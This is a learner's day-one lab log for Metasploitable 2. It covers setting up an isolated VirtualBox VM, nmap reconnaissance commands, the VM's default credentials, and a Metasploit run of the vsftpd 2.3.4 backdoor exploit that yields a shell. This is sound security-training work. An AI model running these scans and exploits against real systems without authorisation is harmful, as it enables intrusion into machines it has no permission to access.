Day 1 — Metasploitable 2 Lab Setup, Recon & First Exploitation
📖 Learning & Preparation

Reviewed documentation on Metasploitable 2 to understand its purpose as a deliberately vulnerable target VM.

Studied the common services and exploits available.

Planned workflow: Recon → Enumeration → Exploitation → Post-Exploitation.

⚙️ Lab Setup

Downloaded Metasploitable 2 and imported into VirtualBox.

Configured networking to Host-only Adapter for safe isolation.

Allocated resources: 512–1024 MB RAM, 1 CPU.

Took snapshots (clean-import, boot-verified) for safe rollback.

Verified login with default creds:

username: msfadmin

password: msfadmin

🔍 Reconnaissance

Performed scanning to identify open ports and vulnerable services.

Commands executed:

# Verify target is alive
ping <TARGET-IP>

# Basic Nmap scan
nmap <TARGET-IP>

# Full service & version detection
sudo nmap -sS -sV -O -Pn <TARGET-IP> -oA scans/metasploitable_day1


Findings:

Open ports: FTP (21), SSH (22), Telnet (23), HTTP (80/8180), SMB (139/445), PostgreSQL (5432), VNC (5900), IRC (6667), etc.

Noted vsftpd 2.3.4 running on port 21 (well-known vulnerable version).

💥 Exploitation — FTP (vsftpd 2.3.4 backdoor)

Using Metasploit Framework, exploited the vulnerable FTP service and obtained a shell.

Commands executed (on Kali attacker):

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET-IP>
run


Result:

Exploit executed successfully.

Gained a shell session on the target via the backdoor.

✅ Day 1 Summary

Learned the fundamentals of Metasploitable 2 and its services.

Set up VM in VirtualBox with secure host-only networking.

Completed initial reconnaissance with Nmap.

Successfully exploited vsftpd 2.3.4 (FTP) using Metasploit, obtaining a shell.

Saved scan outputs and documented results.

📌 Day 1 ends with first successful exploitation. Next steps: deeper service enumeration and multi-service exploitation in Day 2.
